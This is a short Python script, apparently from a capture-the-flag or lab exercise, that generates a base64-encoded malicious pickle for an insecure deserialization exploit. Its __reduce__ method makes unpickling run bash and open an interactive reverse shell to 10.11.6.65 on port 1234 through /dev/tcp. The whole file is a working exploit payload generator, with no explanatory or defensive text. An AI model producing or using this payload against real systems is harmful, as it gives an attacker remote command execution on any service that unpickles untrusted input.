import pickle, base64

class DillPickle:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (["bash", "-c", "exec bash -i &>/dev/tcp/10.11.6.65/1234 <&1"],))

p = pickle.dumps(DillPickle())
print(base64.b64encode(p).decode('ASCII'))

